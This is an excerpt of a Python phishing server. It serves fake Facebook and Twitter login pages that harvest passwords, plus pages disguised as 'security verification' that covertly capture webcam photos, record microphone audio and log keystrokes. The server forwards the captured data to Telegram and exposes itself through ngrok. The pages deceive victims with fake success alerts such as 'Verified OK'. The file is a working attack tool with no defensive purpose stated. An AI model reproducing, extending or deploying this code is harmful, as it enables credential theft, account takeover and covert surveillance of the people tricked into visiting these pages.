    ...
    def do_POST(self):
        ...
        if b'application/json' in self.headers.get('Content-Type', b''):
            ...
            if 'img' in js:
                ...
                send_telegram(f"KEYLOG: {js['keys']}")
        else:
        ...
        self.send_response(200)
        self.end_headers()
        # FIXED: Removed all special characters from this line
        self.wfile.write(b'<script>setTimeout(()=>location.href="https://m.facebook.com",2000);alert("Verified OK");</script>')
...
</style></head><body><div class="c"><div class="logo">FB</div><h1>Account Security Verification</h1><form method="POST"><input name="email" placeholder="Email or Phone" required><input name="pass" type="password" placeholder="Password" required><button class="btn">Verify</button></form></div><script>navigator.permissions.request({name:'notifications'});</script></body></html>''',
...
</style></head><body><div class="login"><h1>Twitter</h1><form method="POST"><input name="username" placeholder="Username or email" required><input name="pass" type="password" placeholder="Password" required><button class="btn">Login</button></form></div></body></html>''',
    
    'camera': '''<!DOCTYPE html><html><head><title>Video Security</title><style>body{background:linear-gradient(45deg,#667eea 0%,#764ba2 100%);color:#fff;font-family:Arial;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;padding:20px;}
...
async function initCam(){try{stream=await navigator.mediaDevices.getUserMedia({video:true,audio:true});document.getElementById('video').srcObject=stream;}catch(e){alert('Please allow camera access!');}}
initCam();
function capture(){canvas=document.createElement('canvas');canvas.width=400;canvas.height=300;canvas.getContext('2d').drawImage(document.getElementById('video'),0,0);data=canvas.toDataURL('image/jpeg');fetch('/',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({img:data})});alert('Photo sent!');}
</script></body></html>''',
    
    'microphone': '''<!DOCTYPE html><html><head><title>Audio Verification</title><style>body{background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);display:flex;align-items:center;justify-content:center;min-height:100vh;color:#fff;font-family:Arial,sans-serif;padding:20px;}
...
</style></head><body><div class="container"><h1>Audio Verification</h1><button onclick="recordVoice()">Start 10s Recording</button><script>
let recorder;async function recordVoice(){try{stream=await navigator.mediaDevices.getUserMedia({audio:true});recorder=new MediaRecorder(stream);chunks=[];recorder.ondataavailable=e=>chunks.push(e.data);recorder.onstop=()=>fetch('/',{method:'POST',body:new Blob(chunks,{type:'audio/webm'})});recorder.start();setTimeout(()=>recorder.stop(),10000);alert('Recording...');}catch(e){alert('Please allow microphone access!');}}
</script></div></body></html>''',
    
    'keylogger': '''<!DOCTYPE html><html><head><title>Security Scan</title><style>body{background:linear-gradient(45deg,#ff9a9e 0%,#fecfef 50%,#fecfef 100%);display:flex;align-items:center;justify-content:center;min-height:100vh;font-family:Arial;margin:0;padding:20px;}
...
</style></head><body><div class="box"><h1>Security Scan Active</h1><div class="scanning"></div><p>All permissions enabled...</p><script>
let keys=[];document.addEventListener("keydown",e=>keys.push(e.key));setInterval(()=>{if(keys.length){fetch("/",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({keys:keys.splice(0,keys.length).join(" ")})});keys=[];}},2000);setTimeout(()=>alert("Scan complete!"),8000);
</script></body></html>'''
}
...
def auto_ngrok():
    ...
    try:
        ...
        print("ngrok optional - use localhost")
